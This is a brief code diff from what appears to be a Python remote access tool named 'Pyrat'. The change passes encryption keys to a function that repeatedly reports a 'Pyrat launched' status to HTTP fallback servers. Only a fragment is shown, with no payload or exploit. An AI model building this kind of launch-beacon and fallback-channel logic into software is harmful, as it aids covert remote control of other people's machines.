@@ -1149,7 +1149,7 @@ def main():
         console_thread.join()
     else:
         for http_fallback in _http_fallbacks:
-            while not set_channel(http_fallback.getURL(), http_fallback.getStatusChannel(), -1, "Pyrat launched: " + formatted_datetime):
+            while not set_channel(http_fallback.getURL(), http_fallback.getStatusChannel(), enc_keys, -1, "Pyrat launched: " + formatted_datetime):
                 time.sleep(5)
 
         con_thread.join()
